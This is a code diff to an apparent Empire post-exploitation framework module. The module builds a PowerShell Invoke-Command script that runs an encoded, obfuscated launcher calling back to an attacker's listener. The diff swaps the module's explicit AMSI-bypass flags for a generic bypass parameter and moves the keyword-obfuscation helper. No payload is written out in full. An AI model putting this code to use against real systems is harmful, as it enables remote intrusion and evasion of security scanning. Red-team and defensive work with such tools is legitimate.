@@ -2,6 +2,8 @@ from __future__ import print_function
 
 from builtins import str
 from builtins import object
+
+from empire.server.utils import data_util
 from empire.server.common import helpers
 from typing import Dict
 
@@ -14,8 +16,6 @@ class Module(object):
 
         # Set booleans to false by default
         obfuscate = False
-        amsi_bypass = False
-        amsi_bypass2 = False
 
         listener_name = params['Listener']
         command = params['Command']
@@ -27,10 +27,6 @@ class Module(object):
         if (params['Obfuscate']).lower() == 'true':
             obfuscate = True
         obfuscate_command = params['ObfuscateCommand']
-        if (params['AMSIBypass']).lower() == 'true':
-            amsi_bypass = True
-        if (params['AMSIBypass2']).lower() == 'true':
-            amsi_bypass2 = True
 
         script = """Invoke-Command """
 
@@ -63,7 +59,10 @@ class Module(object):
 
         elif listener_name:
             # generate the PowerShell one-liner with all of the proper options set
-            launcher = main_menu.stagers.generate_launcher(listener_name, language='powershell', encode=True, obfuscate=obfuscate, obfuscationCommand=obfuscate_command, userAgent=user_agent, proxy=proxy, proxyCreds=proxy_creds, AMSIBypass=amsi_bypass, AMSIBypass2=amsi_bypass2)
+            launcher = main_menu.stagers.generate_launcher(listener_name, language='powershell', encode=True,
+                                                           obfuscate=obfuscate, obfuscationCommand=obfuscate_command,
+                                                           userAgent=user_agent, proxy=proxy, proxyCreds=proxy_creds,
+                                                           bypasses=params['Bypasses'])
             if launcher == "":
                 return ""
 
@@ -83,6 +82,6 @@ class Module(object):
 
         if obfuscate:
             script = helpers.obfuscate(main_menu.installPath, psScript=script, obfuscationCommand=obfuscation_command)
-        script = helpers.keyword_obfuscation(script)
+        script = data_util.keyword_obfuscation(script)
 
         return script
